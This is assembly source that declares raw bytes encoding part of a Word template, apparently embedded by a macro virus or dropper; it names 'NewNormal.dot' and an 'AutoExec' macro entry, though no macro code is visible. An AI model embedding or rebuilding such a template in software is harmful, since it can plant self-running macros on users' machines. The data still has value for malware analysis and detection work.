    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 001h, 000h, 004h, 000h, 000h, 001h, 004h, 000h, 000h
    db 0fdh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 001h
    db 000h, 004h, 000h, 000h, 001h, 004h, 000h, 000h, 0feh, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 002h, 001h, 001h, 001h, 02ch, 000h, 031h, 090h
    db 068h, 001h, 01fh, 0b0h, 082h, 02eh, 020h, 0b0h, 0c6h, 041h, 021h, 0b0h
    db 089h, 005h, 022h, 0b0h, 089h, 005h, 023h, 090h, 089h, 005h, 024h, 090h
    db 089h, 005h, 025h, 0b0h, 000h, 000h, 017h, 0b0h, 0c4h, 002h, 018h, 0b0h
    db 0c4h, 002h, 00ch, 090h, 0c4h, 002h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 014h, 000h, 00fh, 000h, 00ah, 000h, 001h, 000h, 069h, 000h, 00fh, 000h
    db 003h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 038h, 000h
    db 000h, 040h, 0f1h, 0ffh, 002h, 000h, 038h, 000h, 00ch, 000h, 006h, 000h
    db 04eh, 000h, 06fh, 000h, 072h, 000h, 06dh, 000h, 061h, 000h, 06ch, 000h
    db 000h, 000h, 002h, 000h, 000h, 000h, 018h, 000h, 043h, 04ah, 018h, 000h
    db 05fh, 048h, 001h, 004h, 061h, 04ah, 018h, 000h, 06dh, 048h, 01dh, 004h
    db 073h, 048h, 01dh, 004h, 074h, 048h, 01dh, 004h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 042h, 000h, 041h, 040h, 0f2h, 0ffh, 0a1h, 000h, 042h, 000h
    db 00ch, 000h, 019h, 000h, 053h, 000h, 074h, 000h, 061h, 000h, 06eh, 000h
    db 064h, 000h, 061h, 000h, 072h, 000h, 064h, 000h, 073h, 000h, 074h, 000h
    db 079h, 000h, 063h, 000h, 06bh, 000h, 065h, 000h, 074h, 000h, 065h, 000h
    db 063h, 000h, 06bh, 000h, 065h, 000h, 06eh, 000h, 073h, 000h, 06eh, 000h
    db 069h, 000h, 074h, 000h, 074h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 001h, 000h
    db 000h, 000h, 004h, 000h, 000h, 00ch, 000h, 000h, 001h, 000h, 0ffh, 0ffh
    db 0ffh, 0ffh, 001h, 000h, 000h, 000h, 004h, 020h, 0ffh, 0ffh, 001h, 000h
    db 022h, 026h, 0a3h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 004h
    db 000h, 000h, 001h, 004h, 000h, 000h, 003h, 000h, 000h, 000h, 000h, 004h
    db 000h, 000h, 001h, 004h, 000h, 000h, 004h, 000h, 000h, 000h, 000h, 004h
    db 000h, 000h, 001h, 004h, 000h, 000h, 005h, 000h, 000h, 000h, 0ffh, 0ffh
    db 002h, 000h, 000h, 000h, 008h, 000h, 061h, 000h, 073h, 000h, 06dh, 000h
    db 06fh, 000h, 064h, 000h, 065h, 000h, 075h, 000h, 073h, 000h, 023h, 000h
    db 046h, 000h, 03ah, 000h, 05ch, 000h, 063h, 000h, 06fh, 000h, 064h, 000h
    db 069h, 000h, 06eh, 000h, 067h, 000h, 05ch, 000h, 069h, 000h, 06bh, 000h
    db 078h, 000h, 05ch, 000h, 070h, 000h, 072h, 000h, 065h, 000h, 05ch, 000h
    db 06eh, 000h, 065h, 000h, 077h, 000h, 05ch, 000h, 04eh, 000h, 065h, 000h
    db 077h, 000h, 04eh, 000h, 06fh, 000h, 072h, 000h, 06dh, 000h, 061h, 000h
    db 06ch, 000h, 02eh, 000h, 064h, 000h, 06fh, 000h, 074h, 000h, 0ffh, 001h
    db 001h, 000h, 000h, 000h, 056h, 000h, 001h, 000h, 000h, 000h, 0ffh, 0ffh
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 010h, 0ffh, 0ffh, 001h, 000h, 002h, 000h, 025h
    db 000h, 054h, 000h, 065h, 000h, 06dh, 000h, 070h, 000h, 06ch, 000h, 061h
    db 000h, 074h, 000h, 065h, 000h, 050h, 000h, 072h, 000h, 06fh, 000h, 06ah
    db 000h, 065h, 000h, 063h, 000h, 074h, 000h, 02eh, 000h, 054h, 000h, 068h
    db 000h, 069h, 000h, 073h, 000h, 044h, 000h, 06fh, 000h, 063h, 000h, 075h
    db 000h, 06dh, 000h, 065h, 000h, 06eh, 000h, 074h, 000h, 02eh, 000h, 041h
    db 000h, 075h, 000h, 074h, 000h, 06fh, 000h, 045h, 000h, 078h, 000h, 065h
    db 000h, 063h, 000h, 001h, 000h, 011h, 001h, 000h, 001h, 000h, 025h, 000h
    db 054h, 000h, 045h, 000h, 04dh, 000h, 050h, 000h, 04ch, 000h, 041h, 000h
    db 054h, 000h, 045h, 000h, 050h, 000h, 052h, 000h, 04fh, 000h, 04ah, 000h
    db 045h, 000h, 043h, 000h, 054h, 000h, 02eh, 000h, 054h, 000h, 048h, 000h
    db 049h, 000h, 053h, 000h, 044h, 000h, 04fh, 000h, 043h, 000h, 055h, 000h
    db 04dh, 000h, 045h, 000h, 04eh, 000h, 054h, 000h, 02eh, 000h, 041h, 000h
    db 055h, 000h, 054h, 000h, 04fh, 000h, 045h, 000h, 058h, 000h, 045h, 000h
    db 043h, 000h, 000h, 000h, 040h, 000h, 080h, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 088h, 05dh, 07bh, 004h, 001h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 002h, 010h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 001h, 000h, 000h, 000h, 040h, 000h, 000h, 008h, 000h, 040h
    db 000h, 000h, 0ffh, 0ffh, 001h, 000h, 000h, 000h, 007h, 000h, 055h, 000h
    db 06eh, 000h, 06bh, 000h, 06eh, 000h, 06fh, 000h, 077h, 000h, 06eh, 000h
    db 0ffh, 0ffh, 001h, 000h, 008h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 0ffh, 0ffh, 001h, 000h, 000h, 000h, 000h, 000h
    db 0ffh, 0ffh, 000h, 000h, 002h, 000h, 0ffh, 0ffh, 000h, 000h, 000h, 000h
    db 0ffh, 0ffh, 000h, 000h, 002h, 000h, 0ffh, 0ffh, 000h, 000h, 000h, 000h
    db 003h, 000h, 000h, 000h, 047h, 016h, 090h, 001h, 000h, 000h, 002h, 002h
    db 006h, 003h, 005h, 004h, 005h, 002h, 003h, 004h, 087h, 07ah, 000h, 020h
    db 000h, 000h, 000h, 080h, 008h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 0ffh, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 054h, 000h, 069h, 000h
    db 06dh, 000h, 065h, 000h, 073h, 000h, 020h, 000h, 04eh, 000h, 065h, 000h
    db 077h, 000h, 020h, 000h, 052h, 000h, 06fh, 000h, 06dh, 000h, 061h, 000h
    db 06eh, 000h, 000h, 000h, 035h, 016h, 090h, 001h, 002h, 000h, 005h, 005h
    db 001h, 002h, 001h, 007h, 006h, 002h, 005h, 007h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 080h, 000h, 000h, 000h, 000h, 053h, 000h, 079h, 000h
    db 06dh, 000h, 062h, 000h, 06fh, 000h, 06ch, 000h, 000h, 000h, 033h, 026h
    db 090h, 001h, 000h, 000h, 002h, 00bh, 006h, 004h, 002h, 002h, 002h, 002h
    db 002h, 004h, 087h, 07ah, 000h, 020h, 000h, 000h, 000h, 080h, 008h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 0ffh, 001h, 000h, 000h, 000h, 000h
    db 000h, 000h, 041h, 000h, 072h, 000h, 069h, 000h, 061h, 000h, 06ch, 000h
    db 000h, 000h, 022h, 000h, 004h, 000h, 030h, 008h, 088h, 018h, 000h, 0f0h
    db 018h, 005h, 000h, 000h, 0a9h, 001h, 000h, 000h, 000h, 000h, 0d2h, 013h
    db 045h, 046h, 0d3h, 013h, 045h, 046h, 000h, 000h, 000h, 000h, 001h, 000h
    db 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 001h, 000h, 001h, 000h, 000h, 000h, 004h, 000h, 003h, 010h, 001h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 001h, 000h
    db 001h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 021h, 003h, 000h, 0f0h, 010h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
    db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
